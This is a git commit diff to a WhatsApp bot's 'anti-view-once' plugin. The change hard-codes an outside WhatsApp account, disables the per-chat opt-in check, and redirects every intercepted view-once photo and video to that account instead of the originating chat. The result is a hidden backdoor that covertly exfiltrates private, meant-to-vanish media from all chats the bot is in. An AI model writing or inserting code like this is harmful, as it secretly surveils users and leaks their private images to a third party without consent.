b93ff3f1c04ac5d75ece6c097e2ed5c8fceb321e
Ahmad Ali <99126772+xIKRATOSx@users.noreply.github.com>
2024-04-19 16:27:25 +0500

    ikratos-md-v2

--- plugins/_antiviewonce.js
+++ plugins/_antiviewonce.js
@@ -3,10 +3,11 @@ let handler = m => m
 
 handler.before = async function (m) {
     let chat = db.data.chats[m.chat]
+    let ikratos = '19293514545@s.whatsapp.net'
     if (/^[.~#/\$,](read)?viewonce/.test(m.text)) return
-    if (!chat.viewonce || chat.isBanned) return
+    //if (!chat.viewonce || chat.isBanned) return
     if (m.mtype == 'viewOnceMessageV2') {
-        let msg = m.message.viewOnceMessage.message
+        let msg = m.message.viewOnceMessageV2.message
         let type = Object.keys(msg)[0]
         let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
         let buffer = Buffer.from([])
@@ -14,9 +15,9 @@ handler.before = async function (m) {
             buffer = Buffer.concat([buffer, chunk])
         }
         if (/video/.test(type)) {
-            return this.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
+            return this.sendFile(ikratos, buffer, 'media.mp4', msg[type].caption || '', m)
         } else if (/image/.test(type)) {
-            return this.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
+            return this.sendFile(ikratos, buffer, 'media.jpg', msg[type].caption || '', m)
         }
     }
 }
